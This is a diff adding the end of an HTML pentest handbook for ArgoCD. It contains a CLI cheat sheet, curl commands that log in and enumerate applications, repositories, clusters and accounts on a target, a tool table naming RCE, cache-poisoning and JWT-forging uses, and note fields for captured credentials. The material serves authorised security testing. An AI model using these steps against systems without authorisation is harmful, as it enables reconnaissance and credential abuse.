+# Applications
+argocd app list                                       # List apps
+argocd app get APP_NAME                               # App details
+argocd app manifests APP_NAME                         # View manifests
+argocd app diff APP_NAME                              # Diff live vs desired
+argocd app sync APP_NAME                              # Force sync
+argocd app set APP_NAME --repo URL                    # Change source
+argocd app delete APP_NAME --cascade                  # Delete + managed resources
+
+# Projects
+argocd proj list                                      # List projects
+argocd proj get PROJECT                               # Project details
+argocd proj role list PROJECT                         # List roles
+argocd proj role create-token PROJECT ROLE            # Gen project token
+
+# Clusters & Repos
+argocd cluster list                                   # List clusters
+argocd repo list                                      # List repos
+argocd repo add URL --username U --password P         # Add repo
+
+# Admin
+argocd admin settings rbac validate                   # Validate RBAC
+argocd admin settings rbac can ROLE ACTION RESOURCE   # Test policy</div></div>
+
+<h3>Useful API Calls (curl)</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body">BASE="https://argocd.target.com"
+AUTH="Authorization: Bearer $TOKEN"
+
+# Version
+curl -sk "$BASE/api/version"
+
+# Login
+curl -sk "$BASE/api/v1/session" -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"pass"}'
+
+# Enumerate
+curl -sk "$BASE/api/v1/applications" -H "$AUTH" | jq '.items[].metadata.name'
+curl -sk "$BASE/api/v1/repositories" -H "$AUTH" | jq '.items[].repo'
+curl -sk "$BASE/api/v1/clusters" -H "$AUTH" | jq '.items[] | {name,server}'
+curl -sk "$BASE/api/v1/projects" -H "$AUTH" | jq '.items[].metadata.name'
+curl -sk "$BASE/api/v1/account" -H "$AUTH" | jq '.items[].name'
+
+# Settings (unauthenticated)
+curl -sk "$BASE/api/v1/settings" | jq '{dexConfig,oidcConfig,userLoginsDisabled}'
+
+# App details + managed resources
+curl -sk "$BASE/api/v1/applications/APP?resourceTree=true" -H "$AUTH"
+
+# App logs
+curl -sk "$BASE/api/v1/applications/APP/logs?container=main" -H "$AUTH"</div></div>
+
+<h3>Third-Party Tools</h3>
+<table>
+  <tr><th>Tool</th><th>Purpose</th></tr>
+  <tr><td><code>grpcurl</code></td><td>Interact with repo-server gRPC service (RCE exploitation)</td></tr>
+  <tr><td><code>redis-cli</code></td><td>Redis enumeration, cache dumping, and poisoning</td></tr>
+  <tr><td><code>kubeaudit</code></td><td>Audit K8s manifests for security issues (check what ArgoCD deploys)</td></tr>
+  <tr><td><code>kube-hunter</code></td><td>K8s cluster penetration testing (pair with ArgoCD findings)</td></tr>
+  <tr><td><code>trufflehog / gitleaks</code></td><td>Scan cloned repos for hardcoded secrets</td></tr>
+  <tr><td><code>jwt_tool</code></td><td>JWT analysis, tampering, and forging</td></tr>
+  <tr><td><code>nuclei</code></td><td>ArgoCD detection and vulnerability scanning templates</td></tr>
+  <tr><td><code>ScoutSuite</code></td><td>Cloud posture assessment (if ArgoCD runs in cloud-managed K8s)</td></tr>
+</table>
+</div>
+
+<!-- NOTES -->
+<div class="section" id="sec-notes" data-nav="Engagement Notes" data-group="Reference">
+<h2>Engagement Notes</h2>
+<p>Persistent notes for the current engagement. Stored in localStorage.</p>
+
+<h4>Target Information</h4>
+<textarea class="notes-area" id="notes-target" placeholder="ArgoCD URL, version, namespace, cluster context..."></textarea>
+
+<h4>Credentials & Tokens</h4>
+<textarea class="notes-area" id="notes-creds" placeholder="Captured tokens, extracted credentials, API keys..."></textarea>
+
+<h4>Findings</h4>
+<textarea class="notes-area" id="notes-findings" placeholder="Vulnerabilities found, misconfigurations, evidence..."></textarea>
+
+<h4>Attack Narrative</h4>
+<textarea class="notes-area" id="notes-narrative" placeholder="Step-by-step attack chain documentation for the report..."></textarea>
+</div>
+
+</div><!-- /main -->
+
+<script>
+// Navigation structure
+const sections = [
+  { group: 'Foundations', items: [
+    { id: 'sec-overview', label: 'Architecture & Attack Surface' }
+  ]},
+  { group: 'Engagement Lifecycle', items: [
+    { id: 'sec-recon', label: 'Reconnaissance' },
+    { id: 'sec-authn', label: 'Authentication Attacks' },
+    { id: 'sec-rbac', label: 'RBAC & Authorization' },
+    { id: 'sec-api', label: 'API Exploitation' }
+  ]},
+  { group: 'Exploitation', items: [
+    { id: 'sec-reposerver', label: 'Repo-Server RCE' },
+    { id: 'sec-redis', label: 'Redis Cache Attacks' },
+    { id: 'sec-git', label: 'Git & Supply Chain' },
+    { id: 'sec-webhooks', label: 'Webhook Attacks' },
+    { id: 'sec-postexploit', label: 'Post-Exploitation' },
+    { id: 'sec-dex', label: 'Dex & SSO Attacks' }
+  ]},
+  { group: 'Adversary Emulation', items: [
+    { id: 'sec-adversary', label: 'Emulation Scenarios' }
+  ]},
+  { group: 'Reference', items: [
+    { id: 'sec-cves', label: 'CVE Reference' },
+    { id: 'sec-hardening', label: 'Hardening Assessment' },
+    { id: 'sec-tools', label: 'Tools & Commands' },
+    { id: 'sec-notes', label: 'Engagement Notes' }
+  ]}
+];
+
+const navList = document.getElementById('nav-list');
+const searchInput = document.getElementById('search');
+
+function buildNav(filter = '') {
+  navList.innerHTML = '';
+  const lf = filter.toLowerCase();
+  sections.forEach(group => {
+    const items = group.items.filter(i =>
+      !lf || i.label.toLowerCase().includes(lf) ||
+      document.getElementById(i.id)?.textContent.toLowerCase().includes(lf)
+    );
+    if (!items.length) return;
+    const hdr = document.createElement('div');
+    hdr.className = 'nav-section';
+    hdr.textContent = group.group;
+    navList.appendChild(hdr);
+    items.forEach(item => {
+      const el = document.createElement('div');
+      el.className = 'nav-item';
+      el.textContent = item.label;
+      el.dataset.target = item.id;
+      el.onclick = () => showSection(item.id);
+      navList.appendChild(el);
+    });
+  });
+}
+
+function showSection(id) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  const sec = document.getElementById(id);
+  if (sec) {
+    sec.classList.add('active');
+    document.getElementById('main').scrollTop = 0;
+  }
+  const nav = document.querySelector(`.nav-item[data-target="${id}"]`);
+  if (nav) nav.classList.add('active');
+  localStorage.setItem('argocd-active-section', id);
+}
+
+function expandAll() {
+  document.querySelectorAll('.section').forEach(s => s.classList.add('active'));
+}
+
+// Copy code
+function copyCode(btn) {
+  const code = btn.closest('.code-block').querySelector('.code-body').textContent;
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+
+// Notes persistence
+const noteIds = ['notes-target', 'notes-creds', 'notes-findings', 'notes-narrative'];
+
+function loadNotes() {
+  const saved = JSON.parse(localStorage.getItem('argocd-notes') || '{}');
+  noteIds.forEach(id => {
+    const el = document.getElementById(id);
+    if (el && saved[id]) el.value = saved[id];
+  });
+}
+
+function saveNotes() {
+  const data = {};
+  noteIds.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) data[id] = el.value;
+  });
+  localStorage.setItem('argocd-notes', JSON.stringify(data));
+}
+
+function exportNotes() {
+  const saved = JSON.parse(localStorage.getItem('argocd-notes') || '{}');
+  let text = '# ArgoCD Pentest Engagement Notes\n# Exported: ' + new Date().toISOString() + '\n\n';
+  noteIds.forEach(id => {
+    text += `## ${id.replace('notes-', '').toUpperCase()}\n${saved[id] || '(empty)'}\n\n`;
+  });
+  const blob = new Blob([text], { type: 'text/markdown' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'argocd-pentest-notes.md';
+  a.click();
+}
+
+// Init
+noteIds.forEach(id => {
+  const el = document.getElementById(id);
+  if (el) el.addEventListener('input', saveNotes);
+});
+
+searchInput.addEventListener('input', () => buildNav(searchInput.value));
+
+buildNav();
+loadNotes();
+
+const saved = localStorage.getItem('argocd-active-section');
+showSection(saved && document.getElementById(saved) ? saved : 'sec-overview');
+</script>
+</body>
+</html>
